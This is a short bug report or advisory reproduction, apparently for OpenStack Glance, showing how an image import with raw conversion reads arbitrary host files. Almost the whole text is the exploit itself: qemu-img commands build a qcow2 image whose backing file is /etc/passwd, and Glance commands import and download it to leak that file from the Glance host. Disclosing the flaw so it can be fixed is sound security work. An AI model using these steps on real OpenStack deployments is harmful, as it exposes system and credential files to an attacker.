I'm using the Glance file store and have set in /etc/glance/glance-api.conf:
[taskflow_executor]
engine_mode=serial # not sure if needed
conversion_format=raw

Make a malicious image available via HTTP.
$ sudo qemu-img create -f qcow2 /var/www/html/test_image 1M
$ sudo qemu-img rebase -u -b /etc/passwd /var/www/html/test_image

$ glance --os-image-api-version 2 task-create --type import --input '{"import_from_format": "qcow2", "import_from": "http://127.0.0.1/test_image", "image_properties": {"name": "my_image_test", "disk_format": "qcow2", "container_format": "bare"}}'
$ glance image-download my_image_test --file downloaded_image
$ head downloaded_image
<contents from /etc/passwd on the Glance host>
